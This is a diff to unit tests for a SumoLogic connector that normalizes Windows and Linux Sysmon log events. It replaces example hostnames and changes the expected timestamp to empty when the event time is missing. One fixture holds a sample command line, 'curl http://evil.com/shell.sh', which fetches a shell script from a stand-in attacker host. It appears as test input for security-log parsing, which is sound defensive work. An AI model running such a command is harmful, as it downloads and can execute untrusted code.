@@ -247,7 +247,7 @@ class TestNormalizeWindowsEvent:
         """Event ID 4624 should normalize to action=login."""
         event = {
             "system_time": "2026-04-30T20:00:00.000Z",
-            "computer": "DC01.corp.example",
+            "computer": "DC01.qfunction.ai",
             "event_id": {"id": 4624},
             "event_data": {
                 "TargetUserName": "admin",
@@ -319,12 +319,12 @@ class TestNormalizeWindowsEvent:
         """Computer FQDN should be stripped to short name."""
         event = {
             "system_time": "2026-04-30T20:00:00.000Z",
-            "computer": "WIN-DC01.corp.example",
+            "computer": "EC2AMAZ-OCPNFK9.qfunction.ai",
             "event_id": {"id": 4624},
             "event_data": {},
         }
         result = SumoLogicConnector._normalize_windows_event(event, "auth")
-        assert result["host"] == "WIN-DC01"
+        assert result["host"] == "EC2AMAZ-OCPNFK9"
 
     def test_endpoint_sysmon_image(self):
         """Endpoint events should extract process from Image field."""
@@ -356,7 +356,8 @@ class TestNormalizeWindowsEvent:
         assert result["action"] == "event_9999"
 
     def test_missing_system_time(self):
-        """Missing system_time should default to now."""
+        """CLOCK-SPEC Rule 2 (round 6): missing system_time means ABSENT
+        (the old now-default encoded the R6-14 bug)."""
         event = {
             "computer": "DC01",
             "event_id": {"id": 4624},
@@ -364,7 +365,7 @@ class TestNormalizeWindowsEvent:
         }
         result = SumoLogicConnector._normalize_windows_event(event, "auth")
         assert "timestamp" in result
-        assert result["timestamp"] != ""
+        assert result["timestamp"] == ""
 
     def test_event_id_as_int(self):
         """event_id can be an integer directly (not a dict)."""
@@ -414,7 +415,7 @@ class TestNormalizeLinuxSysmonXml:
             'Apr 30 19:51:24 hostname sysmon[1234]: '
             '<Event><System><EventID>1</EventID>'
             '<TimeCreated SystemTime="2026-04-30T19:51:24.000Z"/>'
-            '<Computer>hostname.corp.example</Computer>'
+            '<Computer>hostname.qfunction.ai</Computer>'
             '</System><EventData>'
             '<Data Name="Image">/usr/bin/curl</Data>'
             '<Data Name="CommandLine">curl http://evil.com/shell.sh</Data>'
@@ -504,7 +505,8 @@ class TestNormalizeLinuxSysmonXml:
         assert result["action"] == "event_99"
 
     def test_missing_timestamp(self):
-        """Missing SystemTime should default to now."""
+        """CLOCK-SPEC Rule 2 (round 6): missing SystemTime means ABSENT —
+        the old assertion (defaults to now) encoded the R6-14 bug."""
         raw = (
             '<Event><System><EventID>1</EventID>'
             '<Computer>hostname</Computer>'
@@ -514,7 +516,7 @@ class TestNormalizeLinuxSysmonXml:
         )
         result = SumoLogicConnector._normalize_linux_sysmon_xml(raw, "endpoint")
         assert "timestamp" in result
-        assert result["timestamp"] != ""
+        assert result["timestamp"] == ""
 
     def test_no_level_integrity(self):
         """IntegrityLevel 'no level' should not be included."""
@@ -536,7 +538,7 @@ class TestNormalizeLinuxSysmonXml:
         raw = (
             '<Event><System><EventID>1</EventID>'
             '<TimeCreated SystemTime="2026-04-30T19:51:24.000Z"/>'
-            '<Computer>web01.corp.example</Computer>'
+            '<Computer>web01.qfunction.ai</Computer>'
             '</System><EventData>'
             '<Data Name="Image">/usr/bin/ls</Data>'
             '</EventData></Event>'
